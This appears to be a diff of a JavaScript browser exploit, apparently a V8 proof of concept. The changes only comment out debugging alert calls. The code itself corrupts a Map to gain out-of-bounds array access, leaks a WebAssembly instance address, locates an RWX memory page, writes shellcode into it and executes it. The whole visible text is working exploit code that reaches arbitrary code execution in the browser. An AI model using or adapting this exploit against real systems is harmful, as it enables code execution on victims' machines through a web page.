@@ -93,25 +93,25 @@ function gc() {
     map1 = makeMapOdd(map1, hole);
     arr = new Array(1.1, 1.1);
   }
-  alert(map1.size);
+  //alert(map1.size);
   map1.set(0x10, -1);
   gc();
   leak.ele = wasmInstance;
   map1.set(oob_arr, 0xffff);
 
   let wasm_low = fhi(arr[2]);
-  alert("search wasm mod low addr: " + (wasm_low).toString(16));
+  //alert("search wasm mod low addr: " + (wasm_low).toString(16));
   leak.ele = null;
-  alert("check arr indx 0");
+  //alert("check arr indx 0");
   arr[0] = i2f(wasm_low, 0x20);
   
   let rwx = flow(oob_arr[7]);
-  alert("rwx: " + rwx.toString(16));
+  //alert("rwx: " + rwx.toString(16));
   arr[5] = i2f(rwx, 0x1000);
   alert("backingStore");
   for (let i = 0; i < shellcode.length; i++) {
     rw_view.setInt8(i, shellcode[i]);
   }
-  alert("calc");
+  //alert("calc");
   f();
 </script>
